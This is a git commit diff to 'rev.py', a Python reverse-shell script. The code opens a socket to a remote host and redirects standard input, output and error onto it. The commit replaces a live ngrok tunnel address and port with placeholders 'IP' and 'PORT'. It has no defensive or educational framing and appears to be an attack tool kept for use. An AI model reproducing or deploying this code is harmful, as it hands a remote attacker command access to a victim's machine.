66c5ef318b305bab674d27c75d2a85626924956d
xNoBody12 <59013588+xNoBody12@users.noreply.github.com>
2020-05-11 09:31:06 +0300

    Update rev.py

--- rev.py
+++ rev.py
@@ -1,6 +1,6 @@
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("tcp.ngrok.io",17476))
+s.connect(("IP",PORT))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
